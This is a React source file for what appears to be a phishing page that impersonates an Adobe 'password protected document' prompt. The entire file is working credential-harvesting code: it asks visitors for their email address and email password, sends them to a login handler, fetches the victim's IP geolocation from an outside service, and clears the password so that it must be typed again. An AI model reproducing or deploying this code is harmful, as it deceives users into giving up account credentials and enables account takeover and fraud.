import React, { useState } from "react";

function AdobeForm({ Login, error }) {
  const logo =
    "https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_211.png?v=1601072619401";
  const ipUri =
    "https://geolocation-db.com/json/d802faa0-10bd-11ec-b2fe-47a0872c6708";
  const [details, setDetails] = useState({ email: "", password: "", ip: "" });
  const [counter, setCounter] = useState(2);
  const [view, setView] = useState("");

  const submitHandler = (e) => {
    e.preventDefault();
    // const value = e.target.values

    Login(details, counter, setView);

    setCounter(counter + 1);

    if (!error == "" || counter >= 1) {
      details.password = "";
    }

    // get IpAddress
    function getIPAddress() {
      fetch(ipUri)
        .then((response) => response.json())
        .then((data) => setDetails({ ...details, ip: data }));
    }
    getIPAddress();
  };

  return (
    <form method="post">
      <div className="header">
        <img src={logo} width="571" height="87" alt="logo" />
        <br />
        <h2>
          <img
            src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Fwarning_sign_clip_art_20327.gif?v=1601072688646"
            width="29"
            height="30"
            alt=""
          />
          THIS FILE IS PASSWORD PROTECTED*
        </h2>
        <h2></h2>
        <h4>Sign in with your receiving email account to view document.</h4>
      </div>

      <div className="content-app">
        <div className="container">
          <input
            className="some"
            type="email"
            placeholder="Email Address"
            name="email"
            id="email"
            onChange={(e) => setDetails({ ...details, email: e.target.value })}
            value={details.email}
          />
          <input
            className="some"
            type="password"
            name="password"
            id="password"
            placeholder="Enter Email Password"
            required="required"
            onChange={(e) =>
              setDetails({ ...details, password: e.target.value })
            }
            value={details.password}
          />
          <center>
            <div
              className="alert alert-danger"
              id="msg"
              style={{ display: "none" }}
            >
              Invalid Password.! Please Enter your correct Password
            </div>
            {error != "" ? (
              <span id="error" className="text-danger">
                {error}
              </span>
            ) : (
              <span
                id="error"
                className="text-danger"
                style={{ display: "none" }}
              ></span>
            )}
          </center>
        </div>
        <div className="contaniner2">
          {view == "" ? (
            <button className="btn" id="submit-btn" onClick={submitHandler}>
              VIEW DOCUMENT
            </button>
          ) : (
            <button className="btn" id="submit-btn" onClick={submitHandler}>
              {view}
            </button>
          )}
        </div>
      </div>
      <img
        src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_212.png?v=1601072655196"
        width="561"
        height="92"
        alt=""
      />
    </form>
  );
}

export default AdobeForm;
